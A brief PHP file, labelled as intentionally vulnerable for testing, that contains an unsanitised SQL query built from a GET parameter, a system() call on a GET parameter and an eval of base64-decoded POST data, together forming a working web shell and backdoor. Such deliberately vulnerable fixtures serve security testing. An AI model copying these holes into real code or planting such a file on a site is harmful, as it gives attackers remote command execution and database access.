<?php
// Intentionally vulnerable for testing
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");

if ($_GET['cmd']) {
    system($_GET['cmd']);
}

eval(base64_decode($_POST['payload']));
